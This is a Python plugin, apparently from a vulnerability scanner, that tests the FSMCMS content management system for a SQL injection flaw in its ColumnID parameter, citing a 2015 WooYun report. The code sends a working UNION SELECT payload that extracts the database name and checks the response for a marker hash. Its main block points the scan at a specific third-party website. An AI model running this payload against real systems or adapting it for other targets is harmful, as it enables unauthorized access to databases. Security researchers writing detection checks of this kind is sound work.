#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_PlugName_ = FSMCMS ColumnID参数注入漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0144330
import re
def assign(service, arg):
    if service == 'fsmcms':
        return True, arg
def audit(arg):
    payload = 'fsmcms/cms/web/columninfo.jsp?ColumnID=-5%20UNION%20SELECT%201,2,concat(md5(1),0x7c,database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38#'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_warning(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms', 'http://www.cnfia.cn/')[1])